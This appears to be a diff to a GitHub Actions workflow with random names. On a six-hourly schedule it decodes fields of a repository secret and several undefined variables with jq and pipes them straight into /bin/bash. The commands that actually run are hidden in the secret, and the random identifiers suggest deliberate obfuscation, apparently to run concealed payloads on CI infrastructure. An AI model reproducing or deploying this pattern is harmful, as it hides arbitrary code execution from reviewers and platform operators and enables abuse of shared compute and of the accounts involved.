@@ -3,25 +3,26 @@ name: kedaoma7564
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 0/6 * * *'
-
+    - cron: '10 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kedaoma7564
         env:
-          lw1583: ${{ secrets.lw1583 }}
+          zzov16: ${{ secrets.zzov16 }}
         run: |
-          echo $lw1583 | jq -r .k5 | /bin/bash
-          echo $qoz325 | jq -r .ebtru81605 | /bin/bash
-          echo $kbhxl9 | jq -r .fbdhj88647 | /bin/bash
-          echo $d792 | jq -r .s5839 | /bin/bash
-          echo $hdl70 | jq -r .q99 | /bin/bash
-          echo $iano50241 | jq -r .ueo1 | /bin/bash
-          echo $fvgy9801 | jq -r .j2 | /bin/bash
-          echo $c990 | jq -r .ahina541 | /bin/bash
-          echo $xkzc02404 | jq -r .eyl6 | /bin/bash
+          echo $zzov16 | jq -r .gos42295 | /bin/bash
+          echo $jnuk15 | jq -r .qoe8 | /bin/bash
+          echo $i67441 | jq -r .ykd84 | /bin/bash
+          echo $sawzw6 | jq -r .ayyo564 | /bin/bash
+          echo $yce1667 | jq -r .u0 | /bin/bash
+          echo $ekjco12 | jq -r .pkjj5 | /bin/bash
+          echo $rgyd18 | jq -r .xh8 | /bin/bash
+          echo $x04024 | jq -r .ogwk28 | /bin/bash
+          echo $rkyck3 | jq -r .euatg5 | /bin/bash
+          echo $gcfcr335 | jq -r .ffj9975 | /bin/bash
+          echo $ut66270 | jq -r .yir46104 | /bin/bash
+          echo $eq4368 | jq -r .lita25196 | /bin/bash
 
